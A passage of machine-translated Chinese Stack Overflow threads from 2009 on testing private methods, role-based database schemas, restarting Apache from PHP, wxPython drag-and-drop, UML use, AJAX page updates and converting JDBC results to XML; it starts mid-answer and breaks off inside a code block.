我猜SVN部署方式不是很好。因为：

你需要为全世界开通SVN访问

在生产网络服务器中有许多 .svn

我认为 Phing 生成一个分支 + 合并所有 js/css + 替换阶段配置 + ssh 上传到所有 www 服务器是更好的方法。

ssh 到 10 个 www 服务器和 svn up 也很麻烦。

# unit-testing - 单元测试私有方法：外观模式

> ID：425709
> 
> 赞同：8
> 
> 时间：2009-01-08T20:13:43.250
> 
> 标签：unit-testing, tdd

许多开发人员认为测试私有方法是个坏主意。但是，我发现的所有示例都是基于私有方法是私有的，因为调用它们可能会破坏内部对象的状态。但这不仅仅是隐藏方法的原因。

让我们考虑外观模式。我的班级用户需要 2 个公共方法。它们太大了。在我的示例中，他们需要从数据库的 BLOB 中加载一些复杂的结构，对其进行解析，填充一些临时 COM 对象，运行用户的宏来验证和修改这些对象，并将修改后的对象序列化为 XML。单个方法的功能相当大:-) 这两种公共方法都需要大多数这些操作。因此，我创建了大约 10 个私有方法，并且有 2 个公共方法调用它们。实际上，我的私有方法不一定是私有的；他们不会破坏实例的内部状态。但是，当我不习惯测试私有方法时，我会遇到以下问题：

1.  发布它们对用户来说意味着复杂性（他们有一个不需要的选择）
2.  我无法想象这样一个大型公共方法的 TDD 风格，当您编写 500 多行代码只是为了返回一些东西（甚至不是真正的结果）。
3.  这些方法的数据是从数据库中检索的，测试与数据库相关的功能要困难得多。

当我测试私有方法时：

1.  我不会发布会让用户感到困惑的细节。公共接口包括 2 个方法。
2.  我可以以 TDD 风格工作（逐步编写小方法）。
3.  我可以使用测试数据覆盖大部分课程的功能，而无需连接数据库。

有人可以描述一下，我做错了什么吗？我应该使用什么设计来获得相同的奖金并且不测试私有方法？

更新：在我看来，我已经将我能做的所有事情都提取到了其他课程中。所以，我无法想象我还能提取什么。从数据库加载由 ORM 层执行，解析流，序列化为 XML，运行宏 - 一切都由独立类完成。此类包含相当复杂的数据结构、搜索和转换例程，并调用所有提到的实用程序。所以，我不认为可以提取其他东西。否则，它的职责（关于数据结构的知识）将在类之间划分。

所以，我现在看到的最好的解决方法是分成 2 个对象（外观本身和真实对象，私有方法变为公共）并将真实对象移动到没有人会试图找到它的地方。在我的情况下（Delphi），它将是一个独立的单元，在其他语言中它可能是一个单独的名称空间。其他类似的选项是 2 个接口，感谢您的想法。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2009-01-08T20:17:43.257

我认为您将太多责任（实现）放入外观中。我通常认为这是其他类中实际实现的前端。

所以你的外观中的私有方法很可能是一个或多个其他类中的公共方法。然后你可以在那里测试它们。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-08T20:41:30.807

> 有人可以描述一下，我做错了什么吗？

也许什么都没有？

如果我想测试一个方法，我将其设为默认（包）范围并对其进行测试。

您已经提到了另一个好的解决方案：使用您的两种方法创建一个接口。您的客户访问这两种方法，其他方法的可见性无关紧要。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-08T20:23:07.350

私有方法用于封装一些在您尝试测试的类之外没有意义的行为。您永远不必测试私有方法，因为只有同一类的公共或受保护方法才会调用私有方法。

可能只是您的课程非常复杂，并且需要花费大量精力来测试它。但是，我建议您寻找可以分解为自己的类的抽象。这些类将具有较小的项目范围和要测试的复杂性。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-08T20:23:19.363

我不熟悉您的要求和设计，但您的设计似乎是程序性的，而不是面向对象的。即，您有 2 个公共方法和许多私有方法。如果您将您的类分解为每个对象都有其角色的对象，那么测试每个“小”类会更容易。此外，您可以将“助手”对象访问级别设置为包（Java 中的默认值，我知道 C# 中有类似的访问级别）这样您就不会在 API 中公开它们，但您可以独立地对它们进行单元测试（如它们是单位）。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-01-08T20:48:50.980

也许如果你花点时间看看 Miško 的 [Clean Code Tech 讲座](http://www.youtube.com/watch?v=wEhu57pih5w)。他对如何编写代码以进行测试非常有洞察力。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-01-08T21:57:04.493

这是一个有点争议的话题……大多数 TDD 人员认为重构方法以简化单元测试实际上会使您的设计更好。我认为这通常是正确的，但公共 API 的私有方法的特定情况绝对是一个例外。所以，是的，你应该测试私有方法，不，你不应该公开它。

如果您使用 Java，这是我编写的一个实用方法，可以帮助您测试类中的静态私有方法：

```
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import junit.framework.Assert;

public static Object invokeStaticPrivateMethod(Class<?> clazz, String methodName, Object... params) {
    Assert.assertNotNull(clazz);
    Assert.assertNotNull(methodName);
    Assert.assertNotNull(params);

    // find requested method
    final Method methods[] = clazz.getDeclaredMethods();
    for (int i = 0; i < methods.length; ++i) {
        if (methodName.equals(methods[i].getName())) {
            try {
                // this line makes testing private methods possible :)
                methods[i].setAccessible(true);
                return methods[i].invoke(clazz, params);
            } catch (IllegalArgumentException ex) {
                // maybe method is overloaded - try finding another method with the same name
                continue;
            } catch (IllegalAccessException ex) {
                Assert.fail("IllegalAccessException accessing method '" + methodName + "'");
            } catch (InvocationTargetException ex) {
                // this makes finding out where test failed a bit easier by
                // purging unnecessary stack trace
                if (ex.getCause() instanceof RuntimeException) {
                    throw (RuntimeException) ex.getCause();
                } else {
                    throw new InvocationException(ex.getCause());
                }
            }
        }
    }

    Assert.fail("method '" + methodName + "' not found");
    return null;
} 
```

这可能也可以为非静态方法重写，但是那些讨厌的私有方法通常是私有的，所以我从来不需要它。:)

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-01-09T08:51:23.190

假设您有 8 个私有方法和 2 个公共方法。如果您可以独立执行私有方法，即*不调用任何其他方法，并且没有破坏状态的副作用*，那么仅对该方法进行单元测试是有意义的。但是在那种情况下，方法不需要是私有的！

在 C# 中，我会将此类方法设为受保护而不是私有，并在子类中将它们公开以进行测试

考虑到您的情况，将可测试方法公开并让用户拥有真正的外观可能更有意义，其中只有他们接口所需的 2 个公共方法

# sql - 分配用户角色的首选数据库设计方法？（帽子与组）

> ID：425711
> 
> 赞同：7
> 
> 时间：2009-01-08T20:14:33.513
> 
> 标签：sql, roles, security-roles

我有一个中等大小的 MySQL 数据库，其中包含一个主要的“人员”表，其中包含连接到剧院和戏剧学校的每个人的基本联系信息，我负责维护和开发许多 Web 应用程序。

有些人只是联系人——也就是说，他们的“persons”表记录是我们需要存储的关于他们的所有信息。许多其他人虽然必须能够为各种系统承担不同的角色。其中，大多数都是从学生开始的。有些人从员工开始。学生可以成为实习生或表演者；员工可以成为学生；所有教师都是雇员和表演者等。

从本质上讲，它们是任何个人可能必须佩戴的各种不同的“帽子”，以便访问系统的不同部分并与之交互，以及在我们网站的公共页面上提供有关它们的信息。

我对实现这个模型的选择是有几个其他的表来代表这些“帽子”——这些表包含补充基本“人”信息的元信息，所有这些都使用“人”ID作为他们的主键。例如，作为教师的人在教师表中有一条记录，其中包含他或她的简短传记信息和工资率。所有教师也是员工（但并非所有员工都是教师），这意味着他们在员工表中有一个记录，允许他们将工作时间提交到我们的工资系统中。

我的问题是，这样实现模型有什么缺点？我能想到的唯一另一个选择是用对于大多数条目来说是空的和无用的字段来填充persons表，然后有一个人可以属于的繁琐的“组”表，然后几乎每个表都有每个系统有一个 person`person_id`外键，然后依赖业务逻辑来验证所引用的 person_id 是否属于适当的组；但这很愚蠢，不是吗？

下面是一些示例表声明，希望它们可以展示我当前如何将所有这些放在一起，并希望说明为什么我认为这是一种更明智的方式来模拟系统必须处理的各种情况的现实。

欢迎任何和所有的建议和意见。我很感激你的时间。

**编辑**一些受访者提到使用 ACL 来保证安全性——我在最初的问题中没有提到我实际上是在使用单独的 ACL 包来为不同系统的实际用户进行细粒度的访问控制。我的问题更多是关于在数据库模式中存储有关人员的元数据的最佳实践。

```
CREATE TABLE persons (
    `id`            int(11) NOT NULL auto_increment,
    `firstName`     varchar(50) NOT NULL,
    `middleName`    varchar(50) NOT NULL default '',
    `lastName`      varchar(75) NOT NULL,
    `email`         varchar(100) NOT NULL default '',
    `address`       varchar(255) NOT NULL default '',
    `address2`      varchar(255) NOT NULL default '',
    `city`          varchar(75) NOT NULL default '',
    `state`         varchar(75) NOT NULL default '',
    `zip`           varchar(10) NOT NULL default '',
    `country`       varchar(75) NOT NULL default '',
    `phone`         varchar(30) NOT NULL default '',
    `phone2`        varchar(30) NOT NULL default '',
    `notes`         text NOT NULL default '',
    `birthdate`     date NOT NULL default '0000-00-00',
    `created`       datetime NOT NULL default '0000-00-00 00:00',
    `updated`       timestamp NOT NULL,
    PRIMARY KEY (`id`),
    KEY `lastName` (`lastName`),
    KEY `email` (`email`)
) ENGINE=InnoDB;

CREATE TABLE teachers (
    `person_id`     int(11) NOT NULL,
    `bio`           text NOT NULL default '',
    `image`         varchar(150) NOT NULL default '',
    `payRate`       float(5,2) NOT NULL,
    `active`        boolean NOT NULL default 0,
    PRIMARY KEY (`person_id`),
    FOREIGN KEY(`person_id`) REFERENCES `persons` (`id`)
        ON DELETE RESTRICT ON UPDATE CASCADE
) ENGINE=InnoDB;

CREATE TABLE classes (
    `id`            int(11) NOT NULL auto_increment,
    `teacher_id`    int(11) default NULL,
    `classstatus_id` int(11) NOT NULL default 0,
    `description`   text NOT NULL default '',
    `capacity`      tinyint NOT NULL,
    PRIMARY KEY(`id`),
    FOREIGN KEY(`teacher_id`) REFERENCES `teachers` (`id`)
        ON DELETE RESTRICT ON UPDATE CASCADE,
    FOREIGN KEY(`classstatus_id`) REFERENCES `classstatuses` (`id`)
        ON DELETE RESTRICT ON UPDATE CASCADE,
    KEY (`teacher_id`,`level_id`),
    KEY (`teacher_id`,`classstatus_id`)
) ENGINE=InnoDB;

CREATE TABLE students (
    `person_id`     int(11) NOT NULL,
    `image`         varchar(150) NOT NULL default '',
    `note`          varchar(255) NOT NULL default '',
    PRIMARY KEY (`person_id`),
    FOREIGN KEY(`person_id`) REFERENCES `persons` (`id`)
    ON DELETE RESTRICT ON UPDATE CASCADE
) ENGINE=InnoDB;

CREATE TABLE enrollment (
    `id`                int(11) NOT NULL auto_increment,
    `class_id`          int(11) NOT NULL,
    `student_id`        int(11) NOT NULL,
    `enrollmenttype_id` int(11) NOT NULL,
    `created`           datetime NOT NULL default '0000-00-00 00:00',
    `modified`          timestamp NOT NULL,
    PRIMARY KEY(`id`),
    FOREIGN KEY(`class_id`) REFERENCES `classes` (`id`)
        ON DELETE RESTRICT ON UPDATE CASCADE,
    FOREIGN KEY(`student_id`) REFERENCES `students` (`id`)
        ON DELETE RESTRICT ON UPDATE CASCADE,
    FOREIGN KEY(`enrollmenttype_id`) REFERENCES `enrollmenttypes` (`id`)
        ON DELETE RESTRICT ON UPDATE CASCADE
) ENGINE=InnoDB; 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-01-08T21:55:08.413

去年我也经历过类似的事情。问题是：我们是显式地还是一般地建模我们的实体？在您的示例中，这意味着拥有诸如教师、学生等实体/表，它们之间是否存在直接关系。

最后我们选择了一个通用的“Party”模型。党模型如下：

*   一方**代表**个人或组织；
*   大多数Party 类型都有一个依赖表来存储取决于Party 类型的额外信息，例如Person、Organization、Company；
*   学生或老师之类的东西是**派对角色**。一个当事人可以有任意数量的当事人角色。例如，一个人可能既是教师又是学生；
*   诸如类之类的东西作为**Party Role Relations**处理。例如，教师和学生角色之间的关系表示类关系；
*   参与方角色关系可以具有额外信息的子类型。您的模型中的师生关系是一种注册，它可能具有您正在谈论的额外属性；
*   **各方之间没有直接关系**。只有当事方角色相互关联；和
*   对于常见的信息分组，如果有帮助，我们会创建视图，因为 SQL 可能有点复杂，因为关系更间接（例如，在教师和学生的党实体之间存在三个表）。

这是一个非常强大的模型，在 CRM 类型系统中非常常见。这个模型几乎来自[“数据模型资源书：第 1 卷”](https://rads.stackoverflow.com/amzn/click/com/0471380237)，这是一个很好的资源。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T21:37:34.627

您描述的组和帽子模型是可转换的，一个到另一个。无需担心数据丢失。具体来说，“master groups”表可以通过“hat person”表与各种“hat detail”表的外部连接来生成。

如果您使用的是“帽子”模型，则需要确保给定的“帽子表”准确地封装了该帽子的独特特征。与团体模型相比，那里的宽恕要少得多。

如果您采用这种方式，您可能需要为常见任务设置一些视图 - 例如，如果有人在“教师姓名”字段中输入，并且您想弹出一些自动完成功能，则视图基本上是

```
SELECT firstName, lastName 
FROM persons 
INNER JOIN teachers ON persons.id = teachers.person_id 
```

将有很大帮助。

顺便说一句，我发现有用的一件事是用与原始表中的主键相同的名称来调用外键。这样你就可以

```
INNER JOIN original_table USING (primary_key) 
```

在您的 FROM 中，而不是使用 WHERE 或 ON 等价物。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-06-18T12:23:14.367

我以前用过Party模型。我真的解决了大部分的缺点。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T20:35:59.897

我喜欢帽子方法。过去，我实现了帽子和组的组合。基本上，有一个用户可以执行的所有可能操作（权限）的列表。然后我有一个组表。每个组可以有 1 个或多个操作（权限）。然后我将用户分配到组。

这为我提供了很大的灵活性。我可以在我的许可中获得非常好的颗粒。我也可以通过编辑组来快速更改许多人的权限。事实上，我有权限页面设置来使用相同的权限。这允许最终用户（不是我）为其他用户设置权限。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-08T20:37:44.030

是的，教师是唯一有这样的工资率的人。该字段应该更准确地称为“classPayRate”——这是教师雇员的特例。非教师员工在我们的工资系统中将他们的总小时数作为单独的行项目提交。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-08T20:38:05.650

我可能会将教师更改为员工并添加员工类型。

但是，我绝不会在人员表中存储电子邮件、地址、电话。这些都应该是他们自己的单独表格，因为人们有多个电子邮件地址（工作和家庭）、多个电话号码（工作、家庭、手机、传真）和多个地址（工作、家庭 1、家庭 2、学校等）。我会将每个都放在自己的表中并为其分配一个类型，以便您可以识别哪个类型的地址、电话等。

同样对于地址、电子邮件、电话，您可能需要一个标志来识别哪个是首先用于联系的主要记录。我们调用我们的对应关系，它是一个通过触发器保持最新的布尔值，因为每个有记录的人必须有一个且只有一个对应关系，所以如果它发生变化，旧的必须自动重置以及新的进入，如果是第一个记录，它会自动设置，如果对应的记录被删除，如果有剩余记录，它将分配给另一个。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-08T20:26:39.590

教师是唯一有工资的“人”吗？这样做可能会限制您的设计。您可能想要做的是有一个属性表来存储“人”的附加属性。这将允许将来进行修改。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-08T21:06:00.353

为了安全起见，我更喜欢使用访问控制列表 (ACL)。使用 ACL，您可以拥有 Principal（用户或用户组）、Resources（例如文件、记录或记录组）和 Actions（例如读取、更新、删除）。

默认情况下，没有人有任何特权。要授予权限，您可以添加一个条目，例如 Bob 对 File Abc 具有读取权限。

您应该能够找到可以帮助您实现此类功能的代码。在 Java 中，JAAS 支持这种方法。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-01-08T21:14:27.027

我正在使用 ACL 包来获得网站上的细粒度权限 - 我的问题的核心更多是关于如何为具有不同角色的个人存储元数据并在系统中构建一些保护措施以确保数据完整性（例如person 必须有一个教师记录才能被设置为班级的教师 - 外键约束引用教师表，而不是 person 表）。

# php - PHP可以重启Apache吗？

> ID：425717
> 
> 赞同：15
> 
> 时间：2009-01-08T20:16:04.133
> 
> 标签：php, apache

我有一个本地服务器，需要对虚拟主机 apache 配置文件进行更改，然后重新启动 apache，以便新配置生效。

PHP可以做到这一点吗？我尝试了 passthru 和 exec 但他们没有工作。也许问题是我正在尝试重新启动 PHP 的父进程？

谢谢你的帮助！！

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-01-08T20:22:34.433

我使用了一个 cron 脚本（用 PHP 编写，而不是从网络服务器执行）来检查服务器是否已启动并重新启动服务器。

但是，我不会从服务器创建的进程中执行此操作，因为您知道您将要终止父进程，这对子进程有不好的影响。

最简单的方法是拥有一个 PHP 可以创建的文件 /tmp/RESTART_APACHE，并且 cron 脚本会检查该文件。如果 cron 脚本看到文件 /tmp/RESTART_APACHE，那么它会正确重启 Apache。

使用 cron 脚本会引入延迟（如果您每分钟运行它，最多会延迟 60 秒），但除此之外应该可以按您的意愿工作。

根据您打算如何使用它，这可能会奏效。

（您可能希望使用与 /tmp/ 不同的目录来设置权限并阻止服务器上的任何人创建文件。）

编辑：请参阅 Aaron H 对这篇文章的评论。我同意他的说法：您确实要小心，重新启动网络服务器的能力不是公众普遍可用的服务。

限制对可能触发重启的系统的访问；确保触发重新启动的文件具有限制性权限，因此只有 Web 进程可以创建该文件，并且通常是智能的。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2009-01-08T21:09:26.943

我已经这样做了。然而，它仅用于开发环境，为我们的开发人员按需快速创建虚拟主机。到目前为止工作得非常愉快。

我的方法是在系统上创建一个新用户，授予该用户 sudo 重新加载 apache 的权限，然后从 Apache->PHP 我使用 SSH 到 localhost，并使用授权密钥而不向该用户提供密码，然后发出命令。

这样做的原因是我不想让 apache 用户（通常是 www-data）拥有重新加载自身的权力。我将新用户命名为 wwwctrl。

我使用的命令是：

```
ssh -i /path/to/key-file wwwctrl@localhost sudo /etc/init.d/apache2 reload 
```

我必须以 wwwctrl 用户的身份手动执行此命令一次，才能将本地主机密钥添加到 ~wwwctrl/.ssh/known_hosts。

我使用 proc_open() 来观察命令的执行。

事实上，我正在为不同系统上的不同 Apache 安装生成一批虚拟主机，所以在每个系统上我都有这个 wwwctrl 用户重新加载 Apache，基本上是在“foreach hosts as host do ... wwwctrl@host@”中执行此操作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T20:20:11.287

您不想通过“重新加载”而不是“重新启动”吗？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-08T20:21:22.110

为此，您需要编辑 sudo 文件，然后执行系统上使用的重新启动命令，当然使用 sudo。如果您提供详细信息，我可以告诉您，但您甚至可以这样做吗？是托管的吗？不过，Cron 在这里可能是一个更好的选择。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-08T20:32:47.003

[将能够做到这一点](http://unixhelp.ed.ac.uk/CGI/man-cgi?at)，不确定您是否可以安排到第二个，但我想这取决于实施

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2010-04-24T13:16:45.403

我会创建一个守护进程来监控启用站点的目录，并在添加或修改文件时重新启动 Apache。然后，您不必像 cron 作业那样等待长达 60 秒。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-08T20:23:19.410

这种事情违反了标准的命令链，因为 apache 调用 php，而不是相反。我支持 cron 建议。只需设置一个具有足够权限的 cron 作业来检查主机文件的更改，如果发现任何更改，则重新启动 apache。

# python - 在 wxPython 中的面板之间拖动按钮

> ID：425722
> 
> 赞同：1
> 
> 时间：2009-01-08T20:17:05.613
> 
> 标签：python, drag-and-drop, wxpython

有谁知道一个例子，它显示了如何在 wxPython 中将按钮从一个面板拖动到另一个面板？

我在面板中创建了一个位图按钮，我希望能够将它拖到另一个面板并放在那里。

我没有找到任何使用按钮的示例，只有文本和文件。

我正在使用最新版本的 Python 和 wxPython。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-08T20:21:50.677

如果您想以图形方式表示拖动，一个很好的方法是创建一个在拖动过程中跟随鼠标的无边框框架。您从源框架中删除按钮，暂时将其放在此“拖动框架”中，然后，当用户放下时，将其添加到目标框架中。

# uml - 您是否使用 UML 图来帮助您的开发过程？

> ID：425735
> 
> 赞同：4
> 
> 时间：2009-01-08T20:20:30.523
> 
> 标签：uml, diagram

那么，Stackoverflow 用于文档和/或与开发人员交流的 UML 图（如果有的话）是什么？

在我看来，Stackoverflow 是一个原创的东西，也提供了丰富的用户体验。

只是想知道如何将一个伟大的想法变为现实生活需要（什么有帮助）？我只是一个毕业的学生，​​寻求前辈的建议/经验/建议/例子。

这些图表对现实生活有多大帮助以及在多大程度上（图表），我想知道......

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-25T03:12:26.480

UML 是一种“标准”定义的交流方式。定义明确，它消除了使用其他方法时可能存在的歧义。

话虽如此，我不会在我的团队中使用它们。我发现做正确的 UML 的开销太高了。

由于我在一个在同一地点工作的小团队（大约 5 人）工作，我们经常会坐下来在讨论中画图。如果我们需要参考这些图表，我们将扫描它们并将它们发布到存储库以供以后参考。

UML 可能更适合沟通不畅且可能不在同一地点的团队。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T20:34:14.627

我真的希望我所有的同事都能正确地阅读 UML 图；它已成为谈论 OO 设计的一种通用语言。

早在大型设计时代，我们制作了大量模型，然后放入大型活页夹中。特别是序列图非常适合详细设计。这些活页夹在某些架子上看起来确实令人印象深刻，但事实证明，这些模型中的大部分价值都在*制作它们的过程中*

所以现在我们大多只是在白板上画框，它们之间有线条。但是，每当我们使用明确的符号来精确时，它总是 UML。通常，如果它们看起来值得保留，我们会用手机拍摄它们。有时我们只是把它们留在白板上，因为如果它们在那里呆了几天，它们就会烧到白板上；）[而且你必须特别敢于使用有气味的强力清洁剂]

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-25T03:18:19.697

我在 Inc Magazine 上阅读了一篇关于这个网站的文章，这就是我发现它的方式。显然很少遵循正式程序。基本上，做这件事的人真的很好。我的钱也没有 UML。我想知道他们是否使用OO？

# javascript - 有多少内容被 AJAX 调用替换太多了？

> ID：425744
> 
> 赞同：3
> 
> 时间：2009-01-08T20:22:36.070
> 
> 标签：javascript, ajax

我在尝试进行 AJAX 开发时遇到了一个常见问题。在可能的情况下，我喜欢尝试只更新现有布局中的数据，而不是布局本身。例如，以下面的 div 为例：

```
<div id="content-5">Here is some content</div> 
```

我将从服务器获取更新后的值，`content-5`然后将 content-5 的内容替换为该值。这对于简单的数据替换很有意义，因为值总是以纯形式显示。

有时内容更复杂，我实际上必须获得的不仅仅是原始数据......也许有一些逻辑可以确定值的显示方式，也许样式需要根据里面的数据而有所不同。在这种情况下，我通常在服务器端生成 HTML 并将 HTML 注入到元素中，而不仅仅是原始数据。

示例：来自控制器的状态字段返回为“完成”，但从设计文档中，“完成”应该向用户显示文本“可用”，并且需要以不同于其他状态的方式设置样式。

在 Javascript 中执行此操作需要模板层可能已经处理的一些深入的视图知识。最终结果将是相同的（下面的代码片段），但不同之处在于可能存在一些代码重复和更复杂的 Javascript 层。

```
<div id="content-5"><span class="success">Available</span></div> 
```

毫无疑问，要求系统也需要处理“新”内容。最简单的解决方案是同时获取所有内容，这样我就不需要处理注入新元素的额外复杂性，而不仅仅是替换现有内容。

因此，我创建了一个新模板，将内容包装在具有 ID 的另一个元素中，并在任何时间发生更改时同时批量替换所有内容 div。

```
<div id="allContent">
    <div id="content-1">Some content A</div>
    <div id="content-2">Some content B</div>
    <div id="content-3">Some content C</div>
    <div id="content-4">Some content D</div>
    <div id="content-5">Some content E</div>
</div> 
```

在某些时候，我不得不想：这条线在哪里？在某些时候，感觉就像我最终会用 AJAX 请求替换整个页面。这真的会是个问题吗？

我意识到这可能是相当主观的，但是有什么好的策略可以确定你应该用 AJAX 替换内容到哪个级别？在可能的情况下，仅替换数据似乎是我的首选方法，因为它使 AJAX 控制器非常简单。从模板中替换较大的 HTML 块似乎是处理更复杂的布局和设计问题的最简单方法，并且感觉它可以更容易地维护。还有其他我没有考虑过的选择吗？

我希望会有一些关于以编程方式操作 DOM 的讨论，但我个人真的不喜欢这样。代码最终看起来非常糟糕，并且真的开始根据我的喜好将太多的布局和设计集成到 JS 层中。由于我通常使用某种模板库（无论是原始 PHP、PHP 模板，如 Smarty 还是 Java 中的 JSP），因此尽可能多地保留视觉设计似乎更有意义。

**编辑**

根据前几个答案，这似乎被解读为试图让用户保持在同一页面上，但在网站上四处导航，或者以其他方式在每次更新时以激进的方式更改页面。问题更多是关于如何确定 AJAX 调用的布局工作应该发生在哪里，以及使用 AJAX 请求更改大块代码是否是一种可接受的做法，因为知道替换代码可能看起来几乎与那里的代码相同前。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T20:32:36.723

完全个人意见*，*我的经验法则是更改**不超过 1 个“面板”单元或页面的 33%，以较少者为准**。

这样做的基础是用户应该能够清楚地识别出之前的页面状态与新的状态相关——如果你突然被传送到你右边的建筑物中，你会有什么感觉？对你可怜的用户要温柔。

关于移动和插入页面数据的好处也存在严重的技术问题，我认为这有点像 AJAX 反模式。如果您要这样做，AJAX 会提供什么好处？

您的具体问题似乎取决于从您的 AJAX 请求返回的响应不是“只是”数据的假设。从关注点分离的角度来看，这对我来说是错误的：我希望一个页面已经拥有它需要的所有布局信息，AJAX 响应本身只提供哑数据/标记，以及创建的 JS 事件处理程序将两者缝合在一起的请求，MVC 风格。在这方面，我认为，是的，你做得太多了。

（通过面板，我的意思是一个逻辑设计元素 - 菜单、功能区、项目元数据面板等。）

*编辑：现在我想起来了，我认为 SO 的用户个人资料页面通过这些标签点击打破了我的经验法则*

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-08T20:47:52.073

我认为最重要的要求是刷新要求。如果在几次 AJAX 更新后我点击刷新，我刚才查看的页面应该是到达的页面。如果页面由于任何原因恢复到以前的状态，则 URL 是错误的。如果出于任何原因您的 AJAX 数据将使浏览器中的 URL 无效，那么您不应该使用 AJAX 来获取该数据。

当然也有例外，对于比上一个 AJAX 请求更新的数据。但这显然不是我要说的。实时聊天屏幕可以在最后一个 AJAX 请求和刷新之间接收更新。没什么大不了。我说的是逻辑内容和描述它的 URL 应该始终保持同步。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T20:38:39.410

根据您是否希望人们能够链接到/为当前页面添加书签等，您可能需要导航用户的浏览器。

对于某些应用程序（如 GMail 等）来说，这不是问题，它们永远不会刷新页面。

就我自己而言，我倾向于认为在导航到逻辑上不同的地方时导航浏览器是一种很好的做法。例如。一个人的个人资料与他们的消息列表。

抱歉，如果这含糊不清，那是相当主观的:-)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T20:42:10.790

类似这样的事情的一个很好的指导是问自己，“这个动态应用程序是‘内容’，还是内容内容？” 您的用例听起来像是会随着每个用户而改变的应用程序内容。这可能是阿贾克斯最好的地方，但在一切方面，不只有一把锤子总是好的。您不想在一页上做太多事情。例如，如果某个部分损坏，则整个部分可能会损坏，从而使用户感到沮丧。

在您查看实际页面内容或信息是静态的任何地方的任何地方，我强烈建议避免使用 JavaScript，因为它存在搜索引擎不可见的风险。确保链接到此类信息的任何内容都是可抓取的。实现这一目标的第一步是在服务器端而不是浏览器端动态生成。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-08T20:45:53.293

如果您使用 Smarty 模板来生成页面，只需将模板分割成各种有意义的部分 - news.tpl、email.tpl、weather.tpl - 并让 master.tpl 生成页面结构并调用子模板。

然后，例如，如果您使用由超时触发的 AJAX 调用来刷新新闻，您只需调用服务器，将必要的数据填入 news.tpl，然后将结果返回到您使用 master 设置的新闻 div .tpl。这样，您的新闻布局始终遵循 news.tpl 的模式。（如果您使用 JavaScript 来操作格式化位或在文档加载时设置事件处理，则需要附加该后处理以在 AJAX 调用之后触发。）

您还没有真正了解您要在这里替换的东西的类型，我最初的反应是，如果一个事件触发页面的多个部分一次更新，这表明您可能应该将这些部分合并到一个显示中。

在服务器端完成了多少格式化，而在客户端使用 JavaScript 完成了多少？如果可能的话，我会说服务器端格式，这样你的代码就可以反映你对显示布局和逻辑所做的讨论。客户端格式可用于更多基于界面的问题 - 对表格中的行进行排序，并使用 :odd 和 :even 选择器交替行颜色，显示和隐藏 div 以创建“选项卡式显示”而无需访问服务器，因为数据获胜不要仅仅因为选择一个新标签而改变，诸如此类。

最后，AJAX 是单向的。如果您的网页是数据库上的视图，这不是什么大问题，但是使用 AJAX 操作来代替正常导航是一个糟糕的主意。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-08T20:49:31.540

如果您习惯性地使用 AJAX 调用替换页面的全部内容，我同意您有问题。但是，在我看来，您正在尝试仔细考虑您的设计的含义，并在可能的情况下尝试避免 annakata 所说的这种“AJAX 反模式”。

我的规则有点简单：只要页面上保留大量上下文（例如左侧菜单、标题、各种控件、页面标题等），我可以用 AJAX 调用替换几乎所有内容。话虽这么说，我从来没有为一个页面像你一样多的 AJAX 生成代码而苦恼。

不过，我确实有一个问题：是否可以对状态进行编码，以便您可以只替换示例中的一些 Div 而不是全部？如果没有，你有没有想过这样做？

# java - 从 JDBC 结果集中获取 XML 的最佳方法

> ID：425745
> 
> 赞同：4
> 
> 时间：2009-01-08T20:22:47.333
> 
> 标签：java, xml, jdbc

我正在寻找从 JDBC 结果集中获取 XML 文档的最佳方法。XML 的结构并不是非常重要，但它应该相当快。

为了清楚起见，我想要结果集中的数据和足够的元数据来识别数据（本质上是字段名称）。我目前正在使用 MySQL、DB2、SQL Server，但解决方案需要与数据库无关（因为 SQL Server 中的 XML 不是一个可行的选择）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2011-05-26T08:53:31.740

通过使用WebRowSet，一次就可以将整个ResultSet 转换成XML。WebRowSet 生成的 XML 非常清晰和简单，我不确定速度，因为它还取决于驱动程序的实现。

这是一篇关于[使用 Oracle 的 WebRowSet](http://www.jdbctutorial.net/jdbc-rowset/Jdbc-WebRowSet-Generate-XML-Oracle-tutorial.php)的好文章，我猜它可以满足您的需求。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T20:50:37.810

您是否希望将 ResultSet 表转换为 XML？我不知道任何第三方工具，但 tt 推出自己的工具并不是很难。

你的两个选择是要么有一个恒定的格式：

```
<ResultSet>
  <MetaData>
    <Column name="...." type="..."/>
    ....
  <MetaData>
  <Data>
